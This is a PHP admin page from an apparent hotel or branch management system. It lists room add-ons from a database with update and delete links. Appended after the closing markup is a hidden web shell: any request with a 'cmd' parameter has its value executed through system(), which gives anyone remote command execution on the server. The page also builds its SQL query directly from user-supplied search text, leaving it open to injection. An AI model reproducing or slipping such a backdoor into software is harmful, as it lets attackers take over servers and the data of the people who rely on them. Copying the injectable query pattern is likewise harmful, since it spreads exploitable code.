<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulroom_addons'] == '') 
		{
			$_SESSION['ulroom_addons'] = $_SESSION["ulname"];
			$modulename = 'room_addons';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_text = '';
		$search_text = $_POST["search_text"];	
		
		if(isset($_GET['search_text']))
		{
			if ($_GET['search_text'])
			{
				$search_text = $_GET['search_text'];
			}
		}	
		
		$myblid = $_SESSION['myblid'];
		$myadmin = $_SESSION['myadmin'];
		
		$querydb  = "SELECT 
					 * 
				   FROM 
					 room_addons b, branch_list c
				   WHERE
				     b.blid = c.blid and
					 b.raname LIKE '%$search_text%' ";
					 
		if ($myblid != '') 
		{				 
			$querydb  = $querydb . " and b.blid = '$myblid' ";
		}
		
		$querydb  = $querydb . " 
				   ORDER BY 
					 c.blname, b.raname ";
		$resultdb = mysql_query($querydb);
		echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Room Add-On List</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
<?php
/*									
<form method="post" action="index.php?body=room_addons_dbase">
Filter By Room Add-On Name
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>									
*/
?>
Table Information
									</td>
									<td align="right">
<a title="Add a new entry?" href="index.php?body=room_addons_addeditdel&mybox=add">
Add Record
</a>
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th width="20%">Branch</th>
										<th>Room Add-On</th>
										<th>Rate</th>
										<th>Active</th>
										<th>User/Stamp</th>
										<th>Modify</th>
										<th>Remove</th>
                                    </tr>
                                </thead>
                                <tbody>
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");

	print("<td align=\"left\" valign=\"middle\">$rowdb[blname] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[raname] </td>\n");
	print("<td align=\"left\" valign=\"middle\">" . number_format($rowdb[rarate],2) . "</td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[raactive]  </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[rauser]  <br>" .date('m/d/Y h:i:s A', strtotime($rowdb[rastamp])). "</td>\n");

	print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Update entry?\" href=\"index.php?body=room_addons_addeditdel&mybox=edit&raid=$rowdb[raid]\"> Update </a> ] </td>");
	print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Delete this entry?\" href=\"index.php?body=room_addons_addeditdel&mybox=del&raid=$rowdb[raid]\"> Delete </a> ] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>